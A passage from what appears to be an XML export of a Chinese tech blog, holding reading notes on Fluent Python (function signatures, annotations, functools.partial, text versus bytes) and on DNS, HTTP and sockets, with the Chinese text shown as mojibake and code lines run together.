sig.parameters.items():... print(param.kind, ':', name, '=', param.default)...POSITIONAL_OR_KEYWORD : text = &lt;class 'inspect._empty'&gt;POSITIONAL_OR_KEYWORD : max_len = 80 inspect.signature å‡½æ•°è¿”å›ä¸€ä¸ª inspect.Signature å¯¹è±¡ï¼Œå®ƒæœ‰ä¸€ä¸ª parameters å±æ€§ï¼Œè¿™æ˜¯ä¸€ä¸ªæœ‰åºæ˜ å°„ï¼ŒæŠŠå‚æ•°åå’Œ inspect.Parameter å¯¹è±¡å¯¹åº”èµ·æ¥ã€‚ inspect.Signatureçš„kindå±æ€§æœ‰ä¸‹é¢5ç§: POSITIONAL_OR_KEYWORD:å¯ä»¥é€šè¿‡å®šä½å‚æ•°å’Œå…³é”®å­—å‚æ•°ä¼ å…¥çš„å½¢å‚ï¼ˆå¤šæ•° Python å‡½æ•°çš„å‚æ•°å±äºæ­¤ç±»ï¼‰ã€‚ VAR_POSITIONAL:å®šä½å‚æ•°å…ƒç»„ã€‚ VAR_KEYWORD:å…³é”®å­—å‚æ•°å­—å…¸ã€‚ KEYWORD_ONLY:ä»…é™å…³é”®å­—å‚æ•°ï¼ˆPython 3 æ–°å¢ï¼‰ã€‚ POSITIONAL_ONLY:ä»…é™å®šä½å‚æ•°ï¼›ç›®å‰ï¼ŒPython å£°æ˜å‡½æ•°çš„å¥æ³•ä¸æ”¯æŒï¼Œä½†æ˜¯æœ‰äº›ä½¿ç”¨ C è¯­è¨€å®ç°ä¸”ä¸æ¥å—å…³é”®å­—å‚æ•°çš„å‡½æ•°ï¼ˆå¦‚ divmodï¼‰æ”¯æŒã€‚ å‡½æ•°æ³¨è§£Python 3 æä¾›äº†ä¸€ç§å¥æ³•ï¼Œç”¨äºä¸ºå‡½æ•°å£°æ˜ä¸­çš„å‚æ•°å’Œè¿”å›å€¼é™„åŠ å…ƒæ•°æ®, è¿™å°±æ˜¯æ³¨è§£ã€‚åœ¨clip.pyä¸­å£°æ˜ä¸€ä¸ªæ–°çš„å‡½æ•°clip_with_anno, åªåœ¨å£°æ˜æ—¶åŠ å…¥æ³¨è§£ï¼Œå…¶ä»–ä¸€æ ·ã€‚ 12def clip_with_anno(text:str, max_len: 'int &gt; 0' = 80) -&gt; str: 1234&gt;&gt;&gt; from clip import clip_with_anno&gt;&gt;&gt; clip_with_anno.__annotations__&#123;'text': &lt;class 'str'&gt;, 'max_len': 'int &gt; 0', 'return': &lt;class 'str'&gt;&#125; æ³¨è§£å’Œå‚æ•°ã€è¿”å›å€¼çš„å¯¹åº”å…³ç³»ä¸€ç›®äº†ç„¶ã€‚ç„¶è€ŒPythonæœ¬èº«å¯¹æ³¨è§£æ²¡æœ‰ä»»ä½•æ“ä½œã€‚ Pythonæ ‡å‡†åº“ä¸­ä¸ºæ”¯æŒå‡½æ•°å¼ç¼–ç¨‹æä¾›çš„åŒ…operatoræ¨¡å—ä¸‹é¢å±•ç¤ºäº†ä½¿ç”¨reduceè®¡ç®—é˜¶ä¹˜çš„ä¸¤ç§æ–¹å¼ï¼ŒåŒºåˆ«æ˜¯æ˜¯å¦ä½¿ç”¨äº†operatoråº“ã€‚ 12345678from functools import reducefrom operator import muldef fact(n): return reduce(lambda a, b: a*b, range(1, n+1))def fact_with_mul(n): return reduce(mul, range(1, n+1)) ä¸Šé¢çš„ä¾‹å­ä½¿ç”¨mulé¿å…äº†lambdaè¡¨è¾¾å¼çš„ä½¿ç”¨ã€‚operatorè¿˜æä¾›äº†ä¸€äº›æœ‰æ•ˆçš„å‡½æ•°: attrgetter ä¸ itemgetterè¿™æ ·è·å–å¯¹è±¡å±æ€§å’Œå¯è¿­ä»£å¯¹è±¡çš„å…ƒç´ çš„å‡½æ•°ã€‚ methodcaller åˆ›å»ºçš„å‡½æ•°ä¼šåœ¨å¯¹è±¡ä¸Šè°ƒç”¨å‚æ•°æŒ‡å®šçš„æ–¹æ³• functools.partialfunctools.partial è¿™ä¸ªé«˜é˜¶å‡½æ•°ç”¨äºéƒ¨åˆ†åº”ç”¨ä¸€ä¸ªå‡½æ•°ã€‚éƒ¨åˆ†åº”ç”¨æ˜¯æŒ‡ï¼ŒåŸºäºä¸€ä¸ªå‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„å¯è°ƒç”¨å¯¹è±¡ï¼ŒæŠŠåŸå‡½æ•°çš„æŸäº›å‚æ•°å›ºå®šã€‚ä½¿ç”¨è¿™ä¸ªå‡½æ•°å¯ä»¥æŠŠæ¥å—ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°çš„å‡½æ•°æ”¹ç¼–æˆéœ€è¦å›è°ƒçš„ APIï¼Œè¿™æ ·å‚æ•°æ›´å°‘. 12345678&gt;&gt;&gt; from operator import mul&gt;&gt;&gt; from functools import partial&gt;&gt;&gt; triple = partial(mul, 3)&gt;&gt;&gt; triple(7)21&gt;&gt;&gt; list(map(triple, range(1, 10)))[3, 6, 9, 12, 15, 18, 21, 24, 27] å°ç»“è¿™ä¸€å°èŠ‚ä¸»è¦è®²äº†Pythonå‡½æ•°çš„ä¸€ç­‰æ€§è´¨ï¼Œå³å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡è¿™ä¸€æ¦‚å¿µï¼Œå¹¶è¯´æ˜äº†è¿™ä¸€æ€§è´¨çš„ä¸€éƒ¨åˆ†åº”ç”¨åœºæ™¯ï¼Œä»¥åŠåŠŸèƒ½æœ‰é™çš„lambdaå‡½æ•°çš„ä¸€äº›æ›¿ä»£æ–¹å¼ã€‚ é«˜å¼ºåº¦åŠ ç­äº†ä¸¤å‘¨ï¼Œç»ˆç»ˆç»ˆç»ˆäºæœ‰æ—¶é—´å§è¿™ç« çœ‹å®Œå•¦ To be continued â€¦ æ•¬è¯·æœŸå¾…]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>functional</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„ ç¬¬ä¸€ç« å°è®°]]></title>
    <url>%2F2017%2F11%2F28%2Fhow-network-connects-1%2F</url>
    <content type="text"><![CDATA[ã€Šç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„ç¬¬ä¸€ç« è¯»ä¹¦ç¬”è®°ã€‹ ä¸€. æµè§ˆå™¨ç”Ÿæˆè¯·æ±‚ â€“ æ¢ç´¢æµè§ˆå™¨å†…éƒ¨æ¦‚è§ˆæµè§ˆå™¨å‘å‡ºä¸€ä¸ªè¯·æ±‚ä¼šç»å†ä¸‹é¢å››æ­¥ï¼š ç”Ÿæˆhttpè¯·æ±‚æ¶ˆæ¯ å‘DNSæœåŠ¡å™¨æŸ¥è¯¢webæœåŠ¡å™¨çš„IPï¼ˆå¦‚æœä½¿ç”¨çš„æ˜¯åŸŸåï¼‰ å…¨ä¸–ç•Œçš„DNSæœåŠ¡å™¨æ¥åŠ›ä½¿å¾—ipæŸ¥è¯¢é¡ºåˆ©è¿›è¡Œ å§”æ‰˜åè®®æ ˆå‘é€æ¶ˆæ¯ ç”Ÿæˆhttpè¯·æ±‚æ¶ˆæ¯ URL ç»Ÿä¸€èµ„æºå®šä½ç¬¦ ç”±åè®®+åœ°å€+è·¯å¾„ç»„æˆï¼Œå¼€å¤´éƒ¨åˆ†å†³å®šäº†åè®®ï¼ˆâ€œhttp:â€â€œftp:â€â€œfile:â€â€œmailto:â€ï¼‰ æµè§ˆå™¨è§£æurlæ˜¯å°†å®ƒæ‹†åˆ†è§£æçš„ï¼Œå¦‚httpè¯·æ±‚çš„url,ä¼šæ‹†åˆ†æˆhttp://, åŸŸå/ip, è·¯å¾„ã€‚ æ–‡ä»¶åä¸ºindex.html/default.htmlæ—¶å¯ä»¥è¢«çœç•¥ã€‚ HTTPçš„åŸºæœ¬æ€è·¯:HTTP åè®®å®šä¹‰äº†å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´äº¤äº’çš„æ¶ˆæ¯å†…å®¹å’Œæ­¥éª¤ï¼Œå®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚åŒ…å«â€œå¯¹ä»€ä¹ˆâ€ï¼ˆURIï¼‰è¿›è¡Œä»€ä¹ˆæ ·çš„æ“ä½œ(Method)æ”¶åˆ°HTTPè¯·æ±‚åï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ®Methodå’ŒURIå†³å®šâ€œå¯¹ä»€ä¹ˆè¿›è¡Œä»€ä¹ˆæ“ä½œâ€ï¼Œç„¶åå°†ç»“æœæ”¾åœ¨å“åº”æ¶ˆæ¯ä¸­è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œæµè§ˆå™¨å¯¹è¿”å›çš„æ¶ˆæ¯åšå‡ºå±•ç¤ºï¼Œä¸€æ¬¡HTTPè¯·æ±‚å°±å®Œæˆäº†ã€‚ ç”ŸæˆHTTPè¯·æ±‚:httpæ¶ˆæ¯åœ¨æ ¼å¼ä¸Šæœ‰å¾ˆä¸¥æ ¼çš„è§„å®š, æµè§ˆå™¨ä¼šæŒ‰ç…§è§„èŒƒç”Ÿæˆè¯·æ±‚ã€‚è¯·æ±‚æ¶ˆæ¯çš„ç¬¬ä¸€è¡Œç§°ä¸ºè¯·æ±‚è¡Œï¼Œè¿™è¡Œå¼€å¤´çš„Methodå†³å®šäº†â€ä½œä½•ç§æ“ä½œâ€è¯·æ±‚æ¶ˆæ¯ä¸€èˆ¬åˆ†ä¸ºä¸‰éƒ¨åˆ†Request(è¯·æ±‚è¡Œ), HEADERS(æ¶ˆæ¯å¤´), BODY(æ¶ˆæ¯ä½“)å“åº”æ¶ˆæ¯ä¹Ÿåˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯STATUSï¼ˆçŠ¶æ€è¡Œï¼‰, HEADERS(æ¶ˆæ¯å¤´), BODY(æ¶ˆæ¯ä½“) å‘DNSæœåŠ¡å™¨æŸ¥è¯¢WEBæœåŠ¡å™¨çš„IP å±€åŸŸç½‘å’Œå¹¿åŸŸç½‘éƒ½æ˜¯åŸºäºTCP/IPçš„æ€è·¯è®¾è®¡çš„ï¼Œç®€å•æ¥è¯´å‘¢å°±æ˜¯é€šè¿‡è·¯ç”±å™¨çš„é“¾æ¥ï¼Œå°†å°çš„å­ç½‘è¿æ¥æˆä¸€ä¸ªå¤§çš„ç½‘ç»œã€‚IPå°±æ˜¯åˆ†é…ç»™è®¡ç®—æœºçš„åœ°å€ã€‚è¯·æ±‚é€šè¿‡é›†çº¿å™¨(Hub)-è·¯ç”±å™¨(Router)-Hub-Routerâ€¦çš„æ–¹å¼ä¼ è¾“åˆ°ç›®çš„åœ°å€ã€‚ IPåœ°å€çš„ç½‘ç»œå·å’Œä¸»æœºå·æ˜¯ç”±å­ç½‘æ©ç å†³å®šçš„ï¼Œå­ç½‘æ©ç ä¸º0çš„éƒ¨åˆ†æ˜¯ä¸»æœºå·, 1å¯¹åº”çš„ä½ç½®ä¸ºç½‘ç»œå·ã€‚IP åœ°å€çš„ä¸»æœºå·å…¨0è¡¨ç¤ºæ•´ä¸ªå­ç½‘ï¼Œå…¨1è¡¨ç¤ºå‘å­ç½‘ä¸Šæ‰€æœ‰è®¾å¤‡å‘é€åŒ…ï¼Œå³â€œå¹¿æ’­â€ã€‚ åŸŸåçš„ä½œç”¨æ˜¯æ–¹ä¾¿äººï¼Œä½†æ˜¯è·¯ç”±å™¨å¤„ç†IPæ•ˆç‡æ›´é«˜ï¼Œæ‰€ä»¥æœ‰äº†æŠ˜ä¸­çš„æ–¹æ¡ˆ â€”â€” DNS é€šè¿‡DNS æŸ¥è¯¢IP åœ°å€çš„æ“ä½œç§°ä¸ºåŸŸåè§£æï¼Œå› æ­¤è´Ÿè´£æ‰§è¡Œè§£æï¼ˆresolutionï¼‰è¿™ä¸€æ“ä½œçš„å°±å«è§£æå™¨ï¼ˆresolverï¼‰ã€‚DNSè§£æå™¨åŒ…å«åœ¨ç³»ç»Ÿçš„socketåº“ä¸­ã€‚è°ƒç”¨è§£æå™¨åï¼Œè§£æå™¨ä¼šå‘DNSæœåŠ¡å™¨å‘é€æŸ¥è¯¢æ¶ˆæ¯ï¼Œç„¶åDNS æœåŠ¡å™¨ä¼šè¿”å›å“åº”æ¶ˆæ¯ã€‚å“åº”æ¶ˆæ¯ä¸­åŒ…å«æŸ¥è¯¢åˆ°çš„IP åœ°å€ï¼Œè§£æå™¨ä¼šå–å‡ºIPåœ°å€ï¼Œå¹¶å°†å…¶å†™å…¥æµè§ˆå™¨æŒ‡å®šçš„å†…å­˜åœ°å€ä¸­ï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸€æ¬¡åŸŸåè§£æã€‚5.æµè§ˆå™¨è°ƒç”¨è§£æå™¨æ—¶ï¼Œè§£æå™¨ä¼šå§”æ‰˜ç³»ç»Ÿå†…éƒ¨çš„åè®®æ ˆå‘DNSæœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œæ”¶åˆ°å“åº”æ¶ˆæ¯ï¼Œè§£æå™¨è¯»å–æ¶ˆæ¯åå®Œæˆè§£æï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒDNSæœåŠ¡çš„IPåœ°å€ä¹Ÿå¿…é¡»çŸ¥é“ã€‚ å…¨ä¸–ç•ŒDNSæœåŠ¡å™¨çš„æ¥åŠ›DNSæœåŠ¡å™¨çš„åŸºæœ¬å·¥ä½œæ¥è‡ªå®¢æˆ·ç«¯çš„æŸ¥è¯¢å«æœ‰ä¸‰ä¸ªä¿¡æ¯ åŸŸå Class DNSè®¾è®¡ä¹‹åˆä¸ºå…¶ä»–ç½‘ç»œé¢„ç•™çš„å­—æ®µï¼Œç°åœ¨å›ºå®šIN è®°å½•ç±»å‹ è®°å½•ç±»å‹ ä½œç”¨ Aè®°å½• Aï¼ˆAddressï¼‰ ç”¨æ¥æŒ‡å®šä¸»æœºåï¼ˆæˆ–åŸŸåï¼‰å¯¹åº”çš„IPåœ°å€è®°å½•ã€‚ NSè®°å½• NSï¼ˆName Serverï¼‰ åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œç”¨æ¥æŒ‡å®šè¯¥åŸŸåç”±å“ªä¸ªDNSæœåŠ¡å™¨æ¥è¿›è¡Œè§£æã€‚ MXè®°å½• MXï¼ˆMail Exchangerï¼‰ é‚®ä»¶äº¤æ¢è®°å½•ï¼Œå®ƒæŒ‡å‘ä¸€ä¸ªé‚®ä»¶æœåŠ¡å™¨ï¼Œç”¨äºç”µå­é‚®ä»¶ç³»ç»Ÿå‘é‚®ä»¶æ—¶æ ¹æ®æ”¶ä¿¡äººçš„åœ°å€åç¼€æ¥å®šä½é‚®ä»¶æœåŠ¡å™¨ã€‚ CNAMEè®°å½• CNAMEï¼ˆCanonical Name ï¼‰ åˆ«åè®°å½•ï¼Œå…è®¸æ‚¨å°†å¤šä¸ªåå­—æ˜ å°„åˆ°åŒä¸€å°è®¡ç®—æœºã€‚ TXTè®°å½• TXT ä¸€èˆ¬æŒ‡æŸä¸ªä¸»æœºåæˆ–åŸŸåçš„è¯´æ˜ DNS æœåŠ¡å™¨çš„åŸºæœ¬å·¥ä½œå°±æ˜¯æ ¹æ®éœ€è¦æŸ¥è¯¢çš„åŸŸåå’Œè®°å½•ç±»å‹æŸ¥æ‰¾ç›¸å…³çš„è®°å½•ï¼Œå¹¶å‘å®¢æˆ·ç«¯è¿”å›å“åº”æ¶ˆæ¯ã€‚ åŸŸåçš„å±‚æ¬¡ç»“æ„å°†å…¨çƒçš„æ‰€æœ‰æœåŠ¡å™¨ä¿¡æ¯ä¿å­˜åœ¨åŒä¸€å°DNSæœåŠ¡å™¨ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥éœ€è¦å°†ä¿¡æ¯åˆ†éƒ¨ä¿å­˜åœ¨ä¸åŒçš„æœåŠ¡å™¨ä¸Šã€‚ DNS æœåŠ¡å™¨ä¸­çš„æ‰€æœ‰ä¿¡æ¯éƒ½æ˜¯æŒ‰ç…§åŸŸåä»¥åˆ†å±‚æ¬¡çš„ç»“æ„æ¥ä¿å­˜çš„ï¼Œä»¥ç‚¹åˆ†éš”ä¸åŒå±‚æ¬¡ï¼Œæ¯ä¸€ä¸ªå±‚æ¬¡ç§°ä¸ºä¸€ä¸ªåŸŸã€‚ DNS æœåŠ¡å™¨ä¸­ï¼Œè€Œæ¯ä¸ªåŸŸéƒ½æ˜¯ä½œä¸ºä¸€ä¸ªæ•´ä½“æ¥å¤„ç†çš„ã€‚ä¸€ä¸ªDNSæœåŠ¡å™¨èƒ½å­˜æ”¾å¤šä¸ªåŸŸï¼Œè€Œä¸€ä¸ªåŸŸä¸èƒ½åˆ†å¼€å­˜æ”¾åœ¨ä¸åŒæœåŠ¡å™¨ä¸Šã€‚ äº’è”ç½‘ä¸­çš„åŸŸé€šè¿‡åˆ›å»ºä¸‹çº§çš„åŸŸæ¥åˆ†é…ç»™ä¸åŒçš„å›½å®¶ã€å…¬å¸å’Œç»„ç»‡ä½¿ç”¨ã€‚ å¯»æ‰¾DNSæœåŠ¡å™¨ æœ€ä¸Šçº§çš„åŸŸç§°ä¸ºæ ¹åŸŸ ç”¨ç‚¹è¡¨ç¤ºï¼Œä¸€èˆ¬åŸŸåä¸­å¯ä»¥çœç•¥ ä¸Šçº§åŸŸåçš„æœåŠ¡å™¨ä¿å­˜ä¸‹çº§åŸŸåçš„æœåŠ¡å™¨ä¿¡æ¯ï¼Œé€çº§æŸ¥è¯¢ å¦å¤–å°†æ ¹åŸŸçš„æœåŠ¡å™¨ä¿¡æ¯å­˜åœ¨æ‰€æœ‰çš„DNSæœåŠ¡å™¨ä¸­ï¼Œè¿™æ ·æ‰€æœ‰çš„DNSæœåŠ¡å™¨å°±èƒ½æ‰¾åˆ°æ ¹åŸŸï¼Œåœ¨é€çº§å¾€ä¸‹æŸ¥æ‰¾ã€‚ é€šè¿‡ç¼“å­˜åŠ å¿«DNSæœåŠ¡å™¨çš„å“åº” å¦‚æœè¦æŸ¥è¯¢çš„åŸŸåå’Œç›¸å…³ä¿¡æ¯å·²ç»åœ¨ç¼“å­˜ä¸­ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿”å›å“åº”ï¼Œæ¥ä¸‹æ¥çš„æŸ¥è¯¢å¯ä»¥ä»ç¼“å­˜çš„ä½ç½®å¼€å§‹å‘ä¸‹è¿›è¡Œã€‚ç›¸æ¯”æ¯æ¬¡éƒ½ä»æ ¹åŸŸæ‰¾èµ·æ¥è¯´ï¼Œç¼“å­˜å¯ä»¥å‡å°‘æŸ¥è¯¢æ‰€éœ€çš„æ—¶é—´ã€‚ å¹¶ä¸”ï¼Œå½“è¦æŸ¥è¯¢çš„åŸŸåä¸å­˜åœ¨æ—¶ï¼Œâ€œä¸å­˜åœ¨â€è¿™ä¸€å“åº”ç»“æœä¹Ÿä¼šè¢«ç¼“å­˜ã€‚è¿™æ ·ï¼Œå½“ä¸‹æ¬¡æŸ¥è¯¢è¿™ä¸ªä¸å­˜åœ¨çš„åŸŸåæ—¶ï¼Œä¹Ÿå¯ä»¥å¿«é€Ÿå“åº”ã€‚ ä¸ºäº†é˜²æ­¢ä¹‹å‰æŸ¥è¯¢è¿‡çš„ä¿¡æ¯å‘ç”Ÿæ”¹å˜å¯¼è‡´è§£æé”™è¯¯ï¼Œç¼“å­˜éƒ½æœ‰ä¸€æ®µæ—¶é—´çš„æœ‰æ•ˆæœŸã€‚ å§”æ‰˜åè®®æ ˆå‘é€æ¶ˆæ¯æ•°æ®æ”¶å‘æ“ä½œæ¦‚è§ˆè¦å‘é€ç»™Web æœåŠ¡å™¨çš„HTTP æ¶ˆæ¯æ˜¯ä¸€ç§æ•°å­—ä¿¡æ¯ï¼ˆdigital dataï¼‰ï¼Œå› æ­¤ä¹Ÿå¯ä»¥è¯´æ˜¯å§”æ‰˜åè®®æ ˆæ¥å‘é€æ•°å­—ä¿¡æ¯ã€‚ä½¿ç”¨Socket åº“æ¥æ”¶å‘æ•°æ®çš„æ“ä½œè¿‡ç¨‹å¦‚å›¾ã€‚ç®€å•æ¥è¯´ï¼Œæ”¶å‘æ•°æ®çš„ä¸¤å°è®¡ç®—æœºä¹‹é—´è¿æ¥äº†ä¸€æ¡æ•°æ®é€šé“ï¼Œæ•°æ®æ²¿ç€è¿™æ¡é€šé“æµåŠ¨ï¼Œæœ€ç»ˆåˆ°è¾¾ç›®çš„åœ°ã€‚ å›¾ä¸­æ‰€ç¤ºçš„é€šé“éœ€è¦é€šä¿¡åŒæ–¹äº‹å…ˆå»ºç«‹, å»ºç«‹ç®¡é“çš„å…³é”®åœ¨äºç®¡é“ä¸¤ç«¯çš„æ•°æ®å‡ºå…¥å£ï¼Œç§°ä¸ºå¥—æ¥å­—ã€‚æ”¶å‘æ•°æ®çš„æ“ä½œåˆ†ä¸ºè‹¥å¹²ä¸ªé˜¶æ®µ: åˆ›å»ºå¥—æ¥å­—é˜¶æ®µ â€”â€” æœåŠ¡ç«¯å…ˆåˆ›é€ å¥—æ¥å­—ï¼Œè¿›å…¥ç­‰å¾…çŠ¶æ€ï¼Œå®¢æˆ·ç«¯è¿æ¥ä¹‹å‰åˆ›å»ºï¼Œä¸ºè¿æ¥åšå‡†å¤‡ è¿æ¥é˜¶æ®µ â€”â€” å®¢æˆ·ç«¯å°†ç®¡é“è¿æ¥åˆ°æœåŠ¡ç«¯çš„å¥—æ¥å­—ä¸Š é€šä¿¡é˜¶æ®µ â€”â€” æ”¶å‘æ•°æ® æ–­å¼€é˜¶æ®µ â€”â€” ç”±æœåŠ¡ç«¯æˆ–å®¢æˆ·ç«¯å‘èµ·ï¼Œæ–­å¼€ç®¡é“ï¼Œåˆ é™¤å¥—æ¥å­— è¿™äº›æ“ä½œéƒ½æ˜¯ç”±ç½‘ç»œåº”ç”¨å§”æ‰˜åè®®æ ˆè¿›è¡Œçš„ã€‚ åˆ›å»ºå¥—æ¥å­—é˜¶æ®µè°ƒç”¨socketåº“åˆ›å»ºå¥—æ¥å­—, å¾—åˆ°ä¸€ä¸ªæè¿°ç¬¦ï¼ˆè¿æ¥çš„å”¯ä¸€æ ‡è¯†ï¼‰ è¿æ¥é˜¶æ®µï¼Œå°†ç®¡é“è”é€šè°ƒç”¨Socketåº“ä¸­çš„connectç»„ä»¶è¿›è¡Œè¿æ¥ï¼Œ éœ€è¦ä¼ å…¥3ä¸ªå‚æ•° æè¿°ç¬¦ ï¼š é€šè¿‡æè¿°ç¬¦ä½¿ç”¨ç‰¹å®šçš„å¥—æ¥å­—è¿›è¡Œè¿æ¥ æœåŠ¡å™¨IP : å¿…è¦ ç«¯å£å·ï¼š åŒæ—¶æŒ‡å®šIPå’Œç«¯å£å·æ—¶ï¼Œå°±å¯ä»¥æ˜ç¡®è¯†åˆ«å‡ºæœåŠ¡ç«¯çš„å¥—æ¥å­—ã€‚* å¦‚æœè¯´æè¿°ç¬¦æ˜¯ç”¨æ¥åœ¨ä¸€å°è®¡ç®—æœºå†…éƒ¨è¯†åˆ«å¥—æ¥å­—çš„æœºåˆ¶ï¼Œé‚£ä¹ˆç«¯å£å·å°±æ˜¯ç”¨æ¥è®©é€šä¿¡çš„å¦ä¸€æ–¹èƒ½å¤Ÿè¯†åˆ«å‡ºå¥—æ¥å­—çš„æœºåˆ¶. æ€»è€Œè¨€ä¹‹ï¼Œå°±æ˜¯å½“è°ƒç”¨connect æ—¶ï¼Œåè®®æ ˆå°±ä¼šæ‰§è¡Œè¿æ¥æ“ä½œã€‚å½“è¿æ¥æˆåŠŸåï¼Œåè®®æ ˆä¼šå°†å¯¹æ–¹çš„IP åœ°å€å’Œç«¯å£å·ç­‰ä¿¡æ¯ä¿å­˜åœ¨å¥—æ¥å­—ä¸­ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ”¶å‘æ•°æ®äº†ã€‚ é€šä¿¡é˜¶æ®µï¼š æ•°æ®æ”¶å‘ç®¡é“è”é€šåï¼Œäº‹æƒ…å°±å˜å¾—ç®€å•äº†ï¼šå°†æ•°æ®æ”¾å…¥å¥—æ¥å­—ï¼Œæ•°æ®å°±ä¼šè¢«å‘é€åˆ°å¦ä¸€è¾¹çš„å¥—æ¥å­—ã€‚ æ–­å¼€é˜¶æ®µ: æ”¶å‘æ•°æ®ç»“æŸWeb ä½¿ç”¨çš„HTTP åè®®è§„å®šï¼Œå½“Web æœåŠ¡å™¨å‘é€å®Œå“åº”æ¶ˆæ¯ä¹‹åï¼Œåº”è¯¥ä¸»åŠ¨æ‰§è¡Œæ–­å¼€æ“ä½œï¼Œå› æ­¤Web æœåŠ¡å™¨ä¼šé¦–å…ˆè°ƒç”¨close æ¥æ–­å¼€è¿æ¥ã€‚æ–­å¼€æ“ä½œä¼ è¾¾åˆ°å®¢æˆ·ç«¯ä¹‹åï¼Œå®¢æˆ·ç«¯çš„å¥—æ¥å­—ä¹Ÿä¼šè¿›å…¥æ–­å¼€é˜¶æ®µã€‚HTTP 1.1ä¸­ä¹Ÿå­˜åœ¨ä¸€æ¬¡è¿æ¥ä¸­æ”¶å‘å¤šä¸ªè¯·æ±‚å’Œå“åº”çš„æ–¹æ³•ï¼Œè¿™ç§æƒ…å†µï¼Œå½“æ‰€æœ‰æ•°æ®è¯·æ±‚å®Œåï¼Œç”±å®¢æˆ·ç«¯æ–­å¼€è¿æ¥ã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>http</tag>
        <tag>socket</tag>
        <tag>ç½‘ç»œæ˜¯æ€æ ·è¿æ¥çš„</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[fluent python ç¬¬å››ç« å°è®°]]></title>
    <url>%2F2017%2F11%2F26%2Ffluent-python-4%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬å››ç« è¯»ä¹¦æŠ¥å‘Š Chapter 4. Texts versus Bytesç¬¬å››ç« . æ–‡æœ¬å’Œå­—èŠ‚* æ³¨: æœ¬ç« ä¸­è®¨è®ºçš„æ‰€æœ‰å­—ç¬¦å’Œå­—èŠ‚çš„é—®é¢˜ä»¥Python3ä¸ºä¸»Python 3 æ˜ç¡®åŒºåˆ†äº†äººç±»å¯è¯»çš„æ–‡æœ¬å­—ç¬¦ä¸²(text)å’ŒåŸå§‹çš„å­—èŠ‚åºåˆ—(Bytes)ã€‚éšå¼åœ°æŠŠå­—èŠ‚åºåˆ—è½¬æ¢æˆUnicodeæ–‡æœ¬å·²æˆè¿‡å»ã€‚ å­—ç¬¦é—®é¢˜å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªç›¸å½“ç®€å•çš„æ¦‚å¿µï¼Œä½†æ˜¯å­—ç¬¦çš„å®šä¹‰æ¯”è¾ƒå¤æ‚ã€‚Python3çš„strå¯¹è±¡ä¸­è·å–çš„å•ä¸ªå…ƒç´ æ˜¯Unicode, ä½†æ˜¯Python2çš„strå¯¹è±¡è·å–çš„æ˜¯åŸå§‹çš„å­—èŠ‚åºåˆ—ã€‚Unicode æ ‡å‡†æŠŠå­—ç¬¦çš„æ ‡è¯†å’Œå…·ä½“çš„å­—èŠ‚è¡¨è¿°è¿›è¡Œäº†å¦‚ä¸‹çš„æ˜ç¡®åŒºåˆ†: å­—ç¬¦çš„æ ‡è¯†ï¼Œå³ç ä½ï¼Œæ˜¯ 0~1 114 111(0x10fff)çš„æ•°å­—ï¼ˆåè¿›åˆ¶ï¼‰ï¼Œåœ¨ Unicode æ ‡å‡†ä¸­ä»¥4~6ä¸ªåå…­è¿›åˆ¶æ•°å­—è¡¨ç¤ºï¼Œè€Œä¸”åŠ å‰ç¼€â€œU+â€ã€‚ä¾‹å¦‚ï¼Œå­—æ¯ A çš„ç ä½æ˜¯ U+0041ï¼Œæ¬§å…ƒç¬¦å·çš„ç ä½æ˜¯ U+20ACï¼Œé«˜éŸ³è°±å·çš„ç ä½æ˜¯ U+1D11Eã€‚åœ¨ Unicode 6.3 ä¸­ï¼ˆè¿™æ˜¯ Python 3.4ä½¿ç”¨çš„æ ‡å‡†ï¼‰ï¼Œçº¦ 10% çš„æœ‰æ•ˆç ä½æœ‰å¯¹åº”çš„å­—ç¬¦ã€‚ å­—ç¬¦çš„å…·ä½“è¡¨è¿°å–å†³äºæ‰€ç”¨çš„ç¼–ç ã€‚ç¼–ç æ˜¯åœ¨ç ä½å’Œå­—èŠ‚åºåˆ—ä¹‹é—´è½¬æ¢æ—¶ä½¿ç”¨çš„ç®—æ³•ã€‚åœ¨ UTF-8 ç¼–ç ä¸­ï¼ŒAï¼ˆU+0041ï¼‰çš„ç ä½ç¼–ç æˆå•ä¸ªå­—èŠ‚ \x41ï¼Œè€Œåœ¨ UTF-16LEç¼–ç ä¸­ç¼–ç æˆä¸¤ä¸ªå­—èŠ‚ \x41\x00ã€‚å†ä¸¾ä¸ªä¾‹å­ï¼Œæ¬§å…ƒç¬¦å·ï¼ˆU+20ACï¼‰åœ¨ UTF-8 ç¼–ç ä¸­æ˜¯ä¸‰ä¸ªå­—èŠ‚â€”â€”\xe2\x82\xacï¼Œè€Œåœ¨ UTF-16LE ä¸­ç¼–ç æˆä¸¤ä¸ªå­—èŠ‚ï¼š\xac\x20ã€‚ å°†ç ä½(code points)è½¬åŒ–æˆå­—èŠ‚åºåˆ—(Bytes)çš„è¿‡ç¨‹æ˜¯ç¼–ç ï¼Œå°†å­—ç¬¦åºåˆ—è½¬åŒ–ä¸ºç ä½çš„è¿‡ç¨‹æ˜¯è§£ç ã€‚ å­—èŠ‚æ¦‚è¦ Python 